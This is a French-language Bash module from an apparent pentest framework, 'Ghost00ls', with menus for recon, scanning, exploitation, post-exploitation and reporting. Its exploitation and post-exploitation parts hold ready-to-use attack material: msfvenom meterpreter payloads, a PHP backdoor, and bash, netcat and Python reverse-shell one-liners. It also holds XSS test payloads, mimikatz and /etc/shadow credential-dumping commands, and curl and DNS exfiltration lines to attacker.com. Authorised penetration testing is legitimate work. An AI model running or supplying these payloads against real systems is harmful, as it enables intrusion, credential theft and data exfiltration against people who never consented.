#!/bin/bash
# modules/offensive/pentest.sh
source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/sanitize.sh

LOG_DIR=~/ghost00ls/logs/pentest
mkdir -p "$LOG_DIR"

menu_pentest() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== 💣 Pentest Live ===${NC}"
        echo
        echo -e "${GREEN}1) 🔍 Reconnaissance${NC}"
        echo -e "${GREEN}2) 🎯 Scanning${NC}"
        echo -e "${GREEN}3) 💉 Exploitation${NC}"
        echo -e "${GREEN}4) 🔐 Post-Exploitation${NC}"
        echo -e "${GREEN}5) 📊 Reporting${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) recon_menu ;;
            2) scanning_menu ;;
            3) exploitation_menu ;;
            4) post_exploit_menu ;;
            5) reporting_menu ;;
            0) return ;;
            *) echo -e "${RED}Option invalide !${NC}"; sleep 1 ;;
        esac
    done
}

# === RECONNAISSANCE ===
recon_menu() {
    clear
    banner
    echo -e "${CYAN}=== 🔍 Reconnaissance ===${NC}"
    echo
    echo -e "${GREEN}1) Scan Nmap (rapide)${NC}"
    echo -e "${GREEN}2) Scan Nmap (complet)${NC}"
    echo -e "${GREEN}3) Énumération DNS (dnsenum)${NC}"
    echo -e "${GREEN}4) Découverte sous-domaines (subfinder)${NC}"
    echo -e "${GREEN}5) Traceroute avancé${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " recon_choice

    case $recon_choice in
        1) nmap_quick_scan ;;
        2) nmap_full_scan ;;
        3) dns_enum ;;
        4) subdomain_discovery ;;
        5) advanced_traceroute ;;
        0) return ;;
    esac
}

nmap_quick_scan() {
    clear
    banner
    echo -e "${CYAN}=== 🔍 Nmap Quick Scan ===${NC}"
    echo
    read -p "🎯 Cible (IP ou domaine) : " target
    
    # Validation avec sanitize.sh
    if [[ "$target" =~ ^[0-9.]+$ ]]; then
        target=$(sanitize_ip "$target")
    else
        target=$(sanitize_domain "$target")
    fi
    
    if [ -z "$target" ]; then
        echo -e "${RED}❌ Cible invalide !${NC}"
        read -p "Entrée pour continuer..."
        return
    fi
    
    LOG_FILE="$LOG_DIR/nmap_quick_$(echo "$target" | tr '/' '_')_$(date +%F_%H-%M-%S).txt"
    
    echo -e "${YELLOW}⏳ Scan en cours...${NC}"
    echo
    
    nmap -sV -T4 -F "$target" | tee "$LOG_FILE"
    
    echo
    echo -e "${GREEN}✅ Scan terminé${NC}"
    echo -e "${CYAN}📄 Log : $LOG_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

nmap_full_scan() {
    clear
    banner
    echo -e "${CYAN}=== 🔍 Nmap Full Scan ===${NC}"
    echo
    read -p "🎯 Cible (IP ou domaine) : " target
    
    target=$(sanitize_domain "$target")
    [ -z "$target" ] && { echo -e "${RED}❌ Cible invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/nmap_full_$(echo "$target" | tr '/' '_')_$(date +%F_%H-%M-%S).xml"
    
    echo -e "${YELLOW}⏳ Scan complet (peut prendre 10-30min)...${NC}"
    echo
    
    sudo nmap -sS -sV -O -A -p- -oX "$LOG_FILE" "$target" | tee "${LOG_FILE%.xml}.txt"
    
    echo
    echo -e "${GREEN}✅ Scan terminé${NC}"
    echo -e "${CYAN}📄 XML : $LOG_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

dns_enum() {
    clear
    banner
    echo -e "${CYAN}=== 🌐 Énumération DNS ===${NC}"
    echo
    read -p "🎯 Domaine cible : " domain
    
    domain=$(sanitize_domain "$domain")
    [ -z "$domain" ] && { echo -e "${RED}❌ Domaine invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/dnsenum_${domain}_$(date +%F_%H-%M-%S).txt"
    
    if ! command -v dnsenum &>/dev/null; then
        echo -e "${YELLOW}⚠️ dnsenum non installé${NC}"
        read -p "Installer maintenant ? [Y/n] : " install
        [ "$install" != "n" ] && sudo apt install -y dnsenum
    fi
    
    echo -e "${YELLOW}⏳ Énumération DNS...${NC}"
    dnsenum "$domain" | tee "$LOG_FILE"
    
    echo -e "${GREEN}✅ Log : $LOG_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

subdomain_discovery() {
    clear
    banner
    echo -e "${CYAN}=== 🔎 Découverte Sous-domaines ===${NC}"
    echo
    read -p "🎯 Domaine : " domain
    
    domain=$(sanitize_domain "$domain")
    [ -z "$domain" ] && { echo -e "${RED}❌ Domaine invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/subdomains_${domain}_$(date +%F_%H-%M-%S).txt"
    
    echo -e "${YELLOW}⏳ Recherche sous-domaines...${NC}"
    echo
    
    # Méthode 1 : amass (si installé)
    if command -v amass &>/dev/null; then
        echo -e "${CYAN}[1/2] amass enum...${NC}"
        amass enum -d "$domain" >> "$LOG_FILE"
    fi
    
    # Méthode 2 : subfinder
    if command -v subfinder &>/dev/null; then
        echo -e "${CYAN}[2/2] subfinder...${NC}"
        subfinder -d "$domain" >> "$LOG_FILE"
    fi
    
    # Méthode 3 : fallback avec dnsrecon
    if [ ! -s "$LOG_FILE" ]; then
        echo -e "${YELLOW}Utilisation dnsrecon (fallback)...${NC}"
        dnsrecon -d "$domain" -t std >> "$LOG_FILE" 2>/dev/null
    fi
    
    if [ -s "$LOG_FILE" ]; then
        echo -e "${GREEN}✅ $(wc -l < "$LOG_FILE") sous-domaines trouvés${NC}"
        echo -e "${CYAN}📄 Log : $LOG_FILE${NC}"
    else
        echo -e "${RED}❌ Aucun sous-domaine trouvé${NC}"
    fi
    
    read -p "👉 Entrée pour continuer..."
}

advanced_traceroute() {
    clear
    banner
    echo -e "${CYAN}=== 🛰️ Traceroute Avancé ===${NC}"
    echo
    read -p "🎯 Cible : " target
    
    target=$(sanitize_domain "$target")
    [ -z "$target" ] && { echo -e "${RED}❌ Cible invalide${NC}"; sleep 2; return; }
    
    echo -e "${YELLOW}⏳ Traceroute en cours...${NC}"
    echo
    
    traceroute -I -n "$target"
    
    echo
    read -p "👉 Entrée pour continuer..."
}

# === SCANNING ===
scanning_menu() {
    clear
    banner
    echo -e "${CYAN}=== 🎯 Scanning ===${NC}"
    echo
    echo -e "${GREEN}1) Scan vulnérabilités web (Nikto)${NC}"
    echo -e "${GREEN}2) Scan SQLi (sqlmap)${NC}"
    echo -e "${GREEN}3) Scan XSS (dalfox)${NC}"
    echo -e "${GREEN}4) Directory Bruteforce (gobuster)${NC}"
    echo -e "${GREEN}5) Scan SSL/TLS (testssl.sh)${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " scan_choice

    case $scan_choice in
        1) nikto_scan ;;
        2) sqlmap_scan ;;
        3) xss_scan ;;
        4) dir_bruteforce ;;
        5) ssl_scan ;;
        0) return ;;
    esac
}

nikto_scan() {
    clear
    banner
    echo -e "${CYAN}=== 🌐 Nikto Web Scanner ===${NC}"
    echo
    read -p "🎯 URL cible : " url
    
    url=$(sanitize_url "$url")
    [ -z "$url" ] && { echo -e "${RED}❌ URL invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/nikto_$(echo "$url" | tr '/:' '_')_$(date +%F_%H-%M-%S).txt"
    
    echo -e "${YELLOW}⏳ Scan Nikto...${NC}"
    nikto -h "$url" -output "$LOG_FILE"
    
    echo -e "${GREEN}✅ Log : $LOG_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

sqlmap_scan() {
    clear
    banner
    echo -e "${CYAN}=== 💉 SQLmap Scanner ===${NC}"
    echo
    read -p "🎯 URL vulnérable : " url
    
    url=$(sanitize_url "$url")
    [ -z "$url" ] && { echo -e "${RED}❌ URL invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/sqlmap_$(date +%F_%H-%M-%S).txt"
    
    echo -e "${YELLOW}⏳ Test SQLi...${NC}"
    sqlmap -u "$url" --batch --threads=5 | tee "$LOG_FILE"
    
    echo -e "${GREEN}✅ Log : $LOG_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

xss_scan() {
    clear
    banner
    echo -e "${CYAN}=== ⚡ Scanner XSS ===${NC}"
    echo
    read -p "🎯 URL cible : " url
    
    url=$(sanitize_url "$url")
    [ -z "$url" ] && { echo -e "${RED}❌ URL invalide${NC}"; sleep 2; return; }
    
    if command -v dalfox &>/dev/null; then
        dalfox url "$url"
    else
        echo -e "${YELLOW}⚠️ dalfox non installé, utilisation payloads XSS basiques${NC}"
        echo
        # Payload XSS basiques
        for payload in "<script>alert(1)</script>" "'\"><svg/onload=alert(1)>"; do
            echo -e "${CYAN}Test : $payload${NC}"
            curl -s "${url}?q=${payload}" | grep -i "alert" && echo -e "${RED}🚨 Vulnérable !${NC}"
        done
    fi
    
    read -p "👉 Entrée pour continuer..."
}

dir_bruteforce() {
    clear
    banner
    echo -e "${CYAN}=== 📂 Directory Bruteforce ===${NC}"
    echo
    read -p "🎯 URL cible : " url
    
    url=$(sanitize_url "$url")
    [ -z "$url" ] && { echo -e "${RED}❌ URL invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/gobuster_$(date +%F_%H-%M-%S).txt"
    
    if command -v gobuster &>/dev/null; then
        echo -e "${YELLOW}⏳ Gobuster dir...${NC}"
        gobuster dir -u "$url" -w /usr/share/wordlists/dirb/common.txt | tee "$LOG_FILE"
    elif command -v dirbuster &>/dev/null; then
        dirbuster -u "$url" -l /usr/share/wordlists/dirb/common.txt
    else
        echo -e "${RED}❌ gobuster/dirbuster non installés${NC}"
    fi
    
    read -p "👉 Entrée pour continuer..."
}

ssl_scan() {
    clear
    banner
    echo -e "${CYAN}=== 🔐 SSL/TLS Scanner ===${NC}"
    echo
    read -p "🎯 Hôte:port (ex: example.com:443) : " target
    
    target=$(sanitize_domain "$target")
    [ -z "$target" ] && { echo -e "${RED}❌ Cible invalide${NC}"; sleep 2; return; }
    
    LOG_FILE="$LOG_DIR/testssl_$(echo "$target" | tr ':' '_')_$(date +%F_%H-%M-%S).txt"
    
    if [ -f ~/testssl.sh/testssl.sh ]; then
        ~/testssl.sh/testssl.sh "$target" | tee "$LOG_FILE"
    else
        echo -e "${YELLOW}⚠️ testssl.sh non trouvé${NC}"
        echo -e "${CYAN}Utilisation de nmap NSE scripts...${NC}"
        nmap --script ssl-enum-ciphers -p 443 "$target"
    fi
    
    read -p "👉 Entrée pour continuer..."
}

# === EXPLOITATION ===
exploitation_menu() {
    clear
    banner
    echo -e "${CYAN}=== 💉 Exploitation ===${NC}"
    echo
    echo -e "${GREEN}1) Metasploit Console${NC}"
    echo -e "${GREEN}2) Recherche Exploit-DB${NC}"
    echo -e "${GREEN}3) Payload Generator (msfvenom)${NC}"
    echo -e "${GREEN}4) Reverse Shell Generator${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " exploit_choice

    case $exploit_choice in
        1) msfconsole ;;
        2) searchsploit_query ;;
        3) payload_generator ;;
        4) reverse_shell_gen ;;
        0) return ;;
    esac
}

searchsploit_query() {
    clear
    banner
    echo -e "${CYAN}=== 🔎 Recherche Exploit-DB ===${NC}"
    echo
    read -p "🔍 Terme de recherche : " query
    
    searchsploit "$query"
    
    echo
    read -p "👉 Entrée pour continuer..."
}

payload_generator() {
    clear
    banner
    echo -e "${CYAN}=== 🧨 Payload Generator (msfvenom) ===${NC}"
    echo
    echo -e "${GREEN}1) Windows exe (reverse_tcp)${NC}"
    echo -e "${GREEN}2) Linux elf (reverse_tcp)${NC}"
    echo -e "${GREEN}3) PHP backdoor${NC}"
    echo -e "${GREEN}4) Python reverse shell${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " payload_choice
    
    read -p "🎯 LHOST (ton IP) : " lhost
    read -p "🎯 LPORT (ton port) : " lport
    
    case $payload_choice in
        1)
            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o /tmp/payload.exe
            echo -e "${GREEN}✅ Payload : /tmp/payload.exe${NC}"
            ;;
        2)
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o /tmp/payload.elf
            chmod +x /tmp/payload.elf
            echo -e "${GREEN}✅ Payload : /tmp/payload.elf${NC}"
            ;;
        3)
            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o /tmp/shell.php
            echo -e "${GREEN}✅ Payload : /tmp/shell.php${NC}"
            ;;
        4)
            cat > /tmp/revshell.py << EOF
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$lhost",$lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
            echo -e "${GREEN}✅ Payload : /tmp/revshell.py${NC}"
            ;;
    esac
    
    read -p "👉 Entrée pour continuer..."
}

reverse_shell_gen() {
    clear
    banner
    echo -e "${CYAN}=== 🐚 Reverse Shell Generator ===${NC}"
    echo
    read -p "🎯 LHOST : " lhost
    read -p "🎯 LPORT : " lport
    
    echo
    echo -e "${GREEN}=== Bash ===${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo
    echo -e "${GREEN}=== Netcat ===${NC}"
    echo "nc -e /bin/bash $lhost $lport"
    echo
    echo -e "${GREEN}=== Python ===${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
    echo
    
    read -p "👉 Entrée pour continuer..."
}

# === POST-EXPLOITATION ===
post_exploit_menu() {
    clear
    banner
    echo -e "${CYAN}=== 🔐 Post-Exploitation ===${NC}"
    echo
    echo -e "${GREEN}1) Privilege Escalation Check (LinPEAS/WinPEAS)${NC}"
    echo -e "${GREEN}2) Dumper credentials (mimikatz)${NC}"
    echo -e "${GREEN}3) Persistence${NC}"
    echo -e "${GREEN}4) Data Exfiltration${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " post_choice

    case $post_choice in
        1) privesc_check ;;
        2) cred_dump ;;
        3) persistence_menu ;;
        4) data_exfil ;;
        0) return ;;
    esac
}

privesc_check() {
    clear
    banner
    echo -e "${CYAN}=== 🔓 Privilege Escalation Check ===${NC}"
    echo
    echo -e "${GREEN}1) Linux (LinPEAS)${NC}"
    echo -e "${GREEN}2) Windows (WinPEAS)${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " privesc_choice
    
    case $privesc_choice in
        1)
            echo -e "${YELLOW}Télécharger LinPEAS depuis la cible :${NC}"
            echo "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
            ;;
        2)
            echo -e "${YELLOW}Télécharger WinPEAS depuis la cible :${NC}"
            echo "iwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -outfile winpeas.exe"
            ;;
    esac
    
    read -p "👉 Entrée pour continuer..."
}

cred_dump() {
    clear
    banner
    echo -e "${CYAN}=== 💾 Credential Dumping ===${NC}"
    echo
    echo -e "${YELLOW}Commandes utiles :${NC}"
    echo
    echo -e "${GREEN}Windows :${NC}"
    echo "  mimikatz.exe"
    echo "  sekurlsa::logonpasswords"
    echo
    echo -e "${GREEN}Linux :${NC}"
    echo "  cat /etc/shadow"
    echo "  unshadow passwd shadow > hashes.txt"
    echo "  john hashes.txt"
    echo
    read -p "👉 Entrée pour continuer..."
}

persistence_menu() {
    clear
    banner
    echo -e "${CYAN}=== 🔒 Persistence ===${NC}"
    echo
    echo -e "${YELLOW}Techniques de persistence :${NC}"
    echo
    echo -e "${GREEN}Linux :${NC}"
    echo "  - Cron jobs"
    echo "  - SSH keys"
    echo "  - systemd services"
    echo
    echo -e "${GREEN}Windows :${NC}"
    echo "  - Scheduled tasks"
    echo "  - Registry Run keys"
    echo "  - Services"
    echo
    read -p "👉 Entrée pour continuer..."
}

data_exfil() {
    clear
    banner
    echo -e "${CYAN}=== 📤 Data Exfiltration ===${NC}"
    echo
    echo -e "${YELLOW}Méthodes d'exfiltration :${NC}"
    echo
    echo -e "${GREEN}1. HTTP POST :${NC}"
    echo "   curl -X POST -d @file.txt http://attacker.com/upload"
    echo
    echo -e "${GREEN}2. DNS Tunneling :${NC}"
    echo "   dig @attacker-dns file-content.attacker.com"
    echo
    echo -e "${GREEN}3. FTP :${NC}"
    echo "   curl -T file.txt ftp://attacker.com --user user:pass"
    echo
    read -p "👉 Entrée pour continuer..."
}

# === REPORTING ===
reporting_menu() {
    clear
    banner
    echo -e "${CYAN}=== 📊 Reporting ===${NC}"
    echo
    echo -e "${GREEN}1) Générer rapport Markdown${NC}"
    echo -e "${GREEN}2) Lister tous les logs${NC}"
    echo -e "${GREEN}3) Archiver mission${NC}"
    echo -e "${RED}0) Retour${NC}"
    echo
    read -p "👉 Choix : " report_choice

    case $report_choice in
        1) generate_markdown_report ;;
        2) list_logs ;;
        3) archive_mission ;;
        0) return ;;
    esac
}

generate_markdown_report() {
    clear
    banner
    echo -e "${CYAN}=== 📝 Génération Rapport ===${NC}"
    echo
    read -p "📋 Nom du client : " client
    read -p "📋 Date de la mission : " mission_date
    
    REPORT_FILE=~/ghost00ls/reports/pentest_${client}_$(date +%F).md
    
    cat > "$REPORT_FILE" << EOF
# Rapport de Pentest - $client

**Date** : $mission_date  
**Testeur** : Ghost00ls Framework  
**Scope** : TBD

## Executive Summary

[À compléter]

## Méthodologie

1. Reconnaissance
2. Scanning
3. Exploitation
4. Post-Exploitation
5. Reporting

## Findings

### Critical

[À compléter]

### High

[À compléter]

### Medium

[À compléter]

### Low

[À compléter]

## Logs attachés

$(ls -1 "$LOG_DIR" | head -10)

## Recommandations

[À compléter]

---
*Généré par Ghost00ls Framework*
EOF

    echo -e "${GREEN}✅ Rapport créé : $REPORT_FILE${NC}"
    echo -e "${CYAN}Édite-le avec : nano $REPORT_FILE${NC}"
    read -p "👉 Entrée pour continuer..."
}

list_logs() {
    clear
    banner
    echo -e "${CYAN}=== 📂 Logs Pentest ===${NC}"
    echo
    ls -lht "$LOG_DIR" | head -20
    echo
    read -p "👉 Entrée pour continuer..."
}

archive_mission() {
    clear
    banner
    echo -e "${CYAN}=== 📦 Archivage Mission ===${NC}"
    echo
    read -p "📋 Nom de la mission : " mission_name
    
    ARCHIVE="~/ghost00ls/reports/archive_${mission_name}_$(date +%F).tar.gz"
    
    tar -czf "$ARCHIVE" "$LOG_DIR"
    
    echo -e "${GREEN}✅ Archive créée : $ARCHIVE${NC}"
    read -p "👉 Entrée pour continuer..."
}

# Lancement du menu
menu_pentest
